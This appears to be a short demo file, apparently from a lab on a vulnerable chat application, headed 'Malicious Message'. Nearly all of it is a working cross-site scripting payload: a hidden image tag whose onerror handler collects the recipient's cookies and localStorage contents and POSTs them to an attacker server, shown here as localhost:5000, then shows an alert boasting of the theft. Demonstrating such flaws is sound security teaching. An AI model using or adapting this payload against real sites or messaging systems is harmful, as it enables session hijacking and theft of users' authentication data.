# Malicious Message

Can execute arbitrary JavaScript in the recipient's browser. This example retrieves cookies and localStorage contents from the recipient's browser and sends them to the attacker's server.

```
How's it going? <img style="display:none;" src="http://url.to.file.which/not.exist" onerror="javascript:fetch('http://localhost:5000', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ localStorage: Object.entries(localStorage).map(e => `${e[0]}=${e[1]}`), cookies: document.cookie })}); alert(`I just stole your auth cookie ${document.cookie} and the contents of your localStorage ${Object.entries(localStorage).map(e => `${e[0]}=${e[1]}`)}`);">
```
